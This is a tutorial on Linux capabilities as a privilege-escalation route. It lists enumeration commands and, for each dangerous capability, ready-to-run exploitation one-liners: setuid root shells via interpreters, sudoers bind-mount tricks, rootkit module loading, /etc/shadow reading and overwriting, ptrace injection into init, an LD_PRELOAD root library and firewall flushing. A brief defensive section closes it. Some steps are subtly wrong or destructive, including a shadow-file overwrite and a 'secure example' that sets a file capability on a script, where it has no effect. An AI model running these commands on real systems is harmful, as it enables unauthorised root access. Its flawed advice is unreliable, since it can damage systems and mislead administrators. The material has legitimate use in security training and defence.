## Linux Capabilities for Privilege Escalation

Linux capabilities are a **fine-grained privilege model** that replaces the all-or-nothing approach of SUID root. Instead of giving a binary full root privileges, specific capabilities are assigned. This is a more secure alternative to SUID, but **misconfigured capabilities** can be just as dangerous.

---

### 1. Understanding Linux Capabilities

Capabilities divide root privileges into ~40 distinct units. A binary with capabilities runs with **only those privileges**, not full root.

**Key Concept**: Capabilities can be assigned to:
- **Files** (executable binaries) - persist across executions
- **Processes** (running programs) - inherited at runtime
- **Threads** - per-thread privilege control

**Capability Sets**:
- **Effective (E)**: Currently active capabilities
- **Permitted (P)**: Capabilities that can be used
- **Inheritable (I)**: Capabilities passed to child processes
- **Bounding (B)**: Maximum capabilities a process can gain

---

### 2. Enumeration: Finding Capabilities

**List all files with capabilities**:
```bash
# Find all files with capabilities
getcap -r / 2>/dev/null

# More targeted search
getcap -r /usr/bin /usr/sbin /bin /sbin 2>/dev/null

# Check specific binary
getcap /usr/bin/python3
```

**View process capabilities**:
```bash
# Check current process
capsh --print

# Check running process by PID
cat /proc/<PID>/status | grep Cap
# Convert to human-readable
capsh --decode=0x0000000000000000
```

---

### 3. Dangerous Capabilities & Exploitation

#### A. CAP_SETUID + CAP_SETGID
Allows changing the UID/GID of the process. Combined with binaries that can spawn shells, this grants full root.

**Exploitation**:
```bash
# Python with CAP_SETUID
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with capabilities
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'

# Ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

**Check for interpreters**:
```bash
getcap -r / 2>/dev/null | grep -E "python|perl|ruby|php|node"
```

---

#### B. CAP_SYS_ADMIN
Mount filesystems, manipulate kernel modules, and access raw block devices. Often leads to root.

**Exploitation Methods**:

**1. Mounting /etc**:
```bash
# Create a fake /etc with malicious sudoers
mkdir /tmp/fake_etc
echo 'user ALL=(ALL) NOPASSWD:ALL' > /tmp/fake_etc/sudoers
mount --bind /tmp/fake_etc /etc
sudo bash
```

**2. Mounting /dev/loop for arbitrary file writes**:
```bash
# Create overlay filesystem to hide malicious files
mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/overlay,workdir=/tmp/work /etc
```

**3. Kernel module loading**:
```bash
# Load malicious kernel module
insmod /tmp/rootkit.ko
```

---

#### C. CAP_DAC_OVERRIDE + CAP_DAC_READ_SEARCH
Bypass file read/write/execute permissions. Can read any file on the system.

**Exploitation**:
```bash
# Read /etc/shadow (even with 000 permissions)
cat /etc/shadow

# Write to restricted files
echo 'user:newpassword' > /etc/shadow

# Execute files without execute permissions
sh /tmp/script.sh  # bypasses execute bit
```

---

#### D. CAP_SYS_PTRACE
Allows attaching to any process with `ptrace()`. This can inject code into root processes.

**Exploitation**:
```bash
# Attach to root process and inject shellcode
gdb -p <root_pid>
(gdb) call system("/bin/bash")
```

**Danger**: This effectively allows reading memory from any process, including:
- SSH sessions (capture passwords)
- Running processes (dump sensitive data)
- Keylogging at system level

---

#### E. CAP_SYS_MODULE
Load and unload kernel modules. This is **game over** for system security.

**Exploitation**:
```bash
# Check if binary with CAP_SYS_MODULE exists
getcap -r / 2>/dev/null | grep sys_module

# If Python has this:
python3 -c 'import os; os.system("insmod /tmp/rootkit.ko")'
```

---

#### F. CAP_NET_ADMIN + CAP_NET_RAW
Network manipulation including:
- Packet sniffing/sniffing
- ARP poisoning
- Firewall bypass

**Exploitation**:
```bash
# Sniff network traffic (requires Python with NET_RAW)
python3 -c 'import socket; s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW); print(s.recv(1024))'

# Modify iptables
iptables -F
iptables -A INPUT -j ACCEPT  # Open firewall
```

---

### 4. Capability Inheritance Exploitation

When a process has capabilities, it can pass them to child processes. This creates attack chains.

**Scenario**: A binary has `cap_setuid+ep` but doesn't spawn a shell directly. However, it might call external commands.

**Exploitation via Environment**:
```bash
# Create malicious library
echo 'void __attribute__((constructor)) init() { setuid(0); system("/bin/sh"); }' > exploit.c
gcc -shared -fPIC exploit.c -o exploit.so

# If binary honors LD_PRELOAD (uncommon for SUID, but possible with caps)
LD_PRELOAD=./exploit.so /path/to/capability/binary
```

---

### 5. File vs. Running Process Capabilities

**File-based (persistent)**:
```bash
# Grant capability to a file
setcap cap_net_admin+ep /usr/bin/python3

# Remove capability
setcap -r /usr/bin/python3
```

**Process-based (runtime)**:
```bash
# Run process with specific capabilities
capsh --caps="cap_net_admin+ep" -- -c "/usr/bin/python3"
```

**Note**: File capabilities are **persistent across reboots** and affect all users.

---

### 6. Other Dangerous Capabilities

| Capability | Description | Exploit |
|------------|-------------|---------|
| `CAP_SYS_CHROOT` | `chroot()` system call | Escape chroot via `chroot(".")` + pivot_root |
| `CAP_SYS_BOOT` | Reboot system | `reboot()` | 
| `CAP_SYS_TIME` | Change system clock | Manipulate timestamps for forensics evasion |
| `CAP_SYS_NICE` | Change process priorities | Denial of service |
| `CAP_SYS_RESOURCE` | Resource limits | Set unlimited resources, DoS |
| `CAP_FOWNER` | Bypass file ownership checks | Read/write any file |
| `CAP_MAC_ADMIN` | Override SELinux/AppArmor | Disable MAC systems |
| `CAP_AUDIT_CONTROL` | Control audit subsystem | Hide malicious activities |

---

### 7. Practical Exploitation Workflow

**Step 1: Enumerate**
```bash
getcap -r / 2>/dev/null | tee capabilities.txt
```

**Step 2: Identify dangerous binaries**
```bash
# Look for common interpreters with caps
cat capabilities.txt | grep -E "python|perl|ruby|php|node|sh|bash"

# Focus on specific dangerous capabilities
cat capabilities.txt | grep -E "cap_setuid|cap_sys_admin|cap_dac_override|cap_sys_module"
```

**Step 3: Exploit using GTFOBins or custom methods**

**Example - Python with CAP_SETUID**:
```bash
# Check exact capabilities
getcap /usr/bin/python3.11
# Output: /usr/bin/python3.11 = cap_setuid+ep

# Exploit
/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Example - tar with CAP_DAC_OVERRIDE**:
```bash
# tar can read any file despite permissions
tar -czf /tmp/out.tar.gz /etc/shadow  # Works even if shadow is 000
```

**Example - gdb with CAP_SYS_PTRACE**:
```bash
# Attach to PID 1 (init/systemd) and escalate
gdb -p 1
(gdb) call system("exec /bin/bash 1>&0 2>&0")
```

---

### 8. Automated Tools

**Capability-specific checks**:
```bash
# LinPEAS will check capabilities
./linpeas.sh | grep -i capabilities

# Manual enumeration script
for file in $(find / -type f -executable 2>/dev/null); do
    caps=$(getcap $file 2>/dev/null)
    if [ ! -z "$caps" ]; then
        echo "$caps"
    fi
done
```

---

### 9. Defensive Measures

**For Administrators**:
- **Minimize capabilities**: Only grant necessary capabilities
- **Avoid interpreters**: Never give capabilities to Python/Perl/Ruby interpreters
- **Use `noexec` mounts**: Prevents execution on sensitive partitions
- **Monitor capabilities**: Audit with `getcap -r /` regularly
- **SELinux/AppArmor**: Restrict capability usage further
- **Remove capabilities**: `setcap -r /path/to/binary`

**Secure example**:
```bash
# Instead of giving Python CAP_SETUID
# Grant only to specific script with limited capabilities
setcap cap_setuid+ep /usr/local/bin/safe_script.py
# And ensure script is not writable by regular users
chmod 755 /usr/local/bin/safe_script.py
chown root:root /usr/local/bin/safe_script.py
```
